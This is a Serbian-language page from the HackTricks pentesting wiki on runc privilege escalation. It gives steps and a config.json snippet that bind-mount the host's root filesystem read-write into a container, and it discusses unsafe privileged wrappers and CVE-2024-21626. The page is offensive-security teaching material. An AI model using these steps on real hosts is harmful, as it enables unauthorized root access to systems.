# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako želite da saznate više o **runc**, pogledajte sledeću stranicu:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ako je `runc` dostupan rootful procesu na hostu, možete da koristite OCI bundle čija konfiguracija mounta rekurzivno bind-mountuje hostov `/` na `/` unutar containera, čime se sistem datoteka hosta izlaže u tom mount namespace-u.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Dokumentovani tok rada `runc run` koristi rootful režim: u primerima samog runc-a piše „run as root“. Neprivilegovanom korisniku potrebna je rootless konfiguracija, kao što je `runc spec --rootless`, a runc navodi da za taj režim moraju biti omogućeni korisnički namespace-ovi.<sup>[[1]](#references)</sup>

## Privilegovani wrapper-i i verzije runtime-a

Privilegovani wrapper koji prihvata OCI bundle pod kontrolom pozivaoca može izložiti datoteke hosta ako dozvoljava nebezbedne bind mount-ove. Proverite da li wrapper razrešava traversal i simboličke linkove pre provere izvora i odredišta mount-ova, kao i da li ograničava `process.cwd`. Sudo pravilo ili `config.json` sa dozvolom upisa sami po sebi ne dokazuju da će wrapper prihvatiti bundle ili pokrenuti ga sa privilegijama hosta.

Odvojeno od toga, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) uticao je na upstream verzije `runc`-a od `1.0.0-rc93` do `1.1.11`; `1.1.12` sadrži upstream ispravku. Leaked deskriptori datoteka i nedovoljna provera radnog direktorijuma mogli su da smeste proces kontejnera izvan njegovog root-a tokom određenih tokova rada `runc run` ili `runc exec`. Brojevi deskriptora datoteka zavise od načina pozivanja, a broj verzije ne dokazuje da je sistem ranjiv ako je dobavljač preneo ispravke na starije verzije ili ako pozivalac ne može da utiče na privilegovano pozivanje runtime-a.

## References

- [1] [runc: CLI alat za pokretanje kontejnera](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI specifikacija runtime-a: Mount-ovi](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Deljena podstabla](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
